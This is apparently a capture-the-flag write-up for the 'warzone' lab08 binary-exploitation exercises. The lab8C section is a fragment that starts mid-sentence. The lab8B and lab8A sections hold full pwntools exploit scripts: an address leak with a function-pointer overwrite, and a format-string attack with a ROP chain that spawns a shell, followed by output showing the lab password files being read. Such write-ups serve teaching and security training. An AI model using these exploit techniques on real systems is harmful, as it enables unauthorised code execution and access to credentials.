lab8C:
the first file and the file descriptor 3 as the second  file, these are both the same file. The difference is that the  file-contents of the second file will not be filtered because our option  does not containg the string .pass:

lab8C@warzone:/levels/lab08$ ./lab8C -fn=/home/lab8B/.pass -fd=3"<<<For security reasons, your filename has been blocked>>>" is lexicograph

lab8B:

from pwn import *
 
Leaks the address of printf.
–> Uses this address to calculate the address of thisIsASecret (adding 0x190e27).
–> Stores the address of thisIsASecret – 1 in v1.e.
–> Stores the value 1 in v2.e (zeros are not allowed!).
–> Summing up both vectors in v3.
–> Chooses 4. Save sum to favorites 5 times to overwrite printFunc with the value of v3.e.
–> Loads the 5th favorite in v1.
–> Prints the vector v1 triggering the call to thisIsASecret.

def enterData(p, v, data):
  p.sendline("1") # 1. Enter data
  p.sendline(str(v))   # vector
  for i in range(len(data)):
    p.sendline(str(data[i]))
  p.recv(1000)

def sumVectors(p):
  p.sendline("2") # 2. Sum vectors

def printVector(p, v):
  p.sendline("3") # 3. Print vector
  p.sendline(str(v))
  return p.recv(1000)

def leakPrintf(p):
  ret = printVector(p, 1)
  addr = int(ret[0x33:0x37][::-1].encode("hex"), 16)
  return addr

def saveSumToFav(p):
  p.sendline("4") # 4. Save sum to favorites
  p.recv(1000)
 

def loadFavorite(p, fav, v):
  p.sendline("6") # 6. Load favorite
  p.sendline(str(fav))
  p.sendline(str(v))
  p.recv(1000)
 
 
 
p = process("./lab8B")
p.recv(1000)
 
addr_printf = leakPrintf(p)
log.info("printf addr: " + hex(addr_printf))
 
addr_secret = addr_printf + 0x190e27
log.info("secret addr: " + hex(addr_secret))
 
enterData(p, 1, [1, 1, 1, 1, addr_secret-1, 1, 1, 1, 1])
enterData(p, 2, [1, 1, 1, 1, 1, 1, 1, 1, 1])
sumVectors(p)
for i in range(5): saveSumToFav(p)
loadFavorite(p, 4, 1)
printVector(p, 1)
 
p.interactive()

Running the script:
lab8B@warzone:/levels/lab08$ python3 /tmp/8B.py
[+] Starting program './lab8B': Done
[*] printf addr: 0xb7622280
[*] secret addr: 0xb77b30a7
[*] Switching to interactive mode
$ whoami
lab8A
$ cat /home/lab8A/.pass
Th@t_w@5_my_f@v0r1t3_ch@11

lab8A:

–> Leak a stack address and store "/bin/sh" (first call to selectABook).
–> Store our ROP-chain (second call to selectABook).
–> Overwrite the return address of the second call with the pivoting gadget using the format string vulnerability (third call to selectABook).
–> Enter some valid input to reach the ret instruction (fourth call to selectABook).

from pwn import *
 
p = remote("localhost", 8841)

fmt = "%p/bin/sh" 
p.sendline(fmt)
ret = p.recv(1000)
stack_leak = int(ret[0xe1:0xe9], 16)
log.success("stack_leak: " + hex(stack_leak))
addr_binsh = stack_leak + 2
 
fmt  = p32(0x08054b45) 
 
fmt += p32(0x0807b8dc) 

 
fmt += p32(0x08049c73) 
               
fmt += p32(addr_binsh)
fmt += p32(0xdeadbeef)
fmt += p32(0xdeadbeef)
fmt += p32(0xdeadbeef) 
 
 
fmt += p32(0x08069443) 
fmt += p32(0x2152411c) 
 
fmt += p32(0x08069443) 
fmt += p32(0xdeadbeef) 

 
fmt += p32(0x08048ef6) 
 
p.sendline(fmt)
 
 
addr_buf = 0x080b4f89          
addr_write = stack_leak - 0xc - 0x214 
 
value_u2 = addr_buf >> 16
value_l2 = addr_buf & 0xffff
 
fmt  = p32(addr_write+2) # arg selector: $1
fmt += p32(addr_write)   # arg selector: $2
fmt += "%" + str(value_u2 - 8) + "x"
fmt += "%2$hn"
fmt += "%" + str(value_l2 - value_u2) + "x"
fmt += "%3$hn"
p.sendline(fmt)
 
p.sendline("A")
p.recvuntil("biped? \n")
 
p.interactive()


lab8A@warzone:/levels/lab08$ python3 /tmp/8A.py
[+] Opening connection to localhost on port 8841: Done
[+] stack_leak: 0xbfebd390
[*] Switching to interactive mode
$ id
uid=1032(lab8end) gid=1033(lab8end) groups=1033(lab8end),1001(gameuser)
$ cat /home/lab8end/.pass
H4x0r5_d0nt_N33d_m3t4pHYS1c5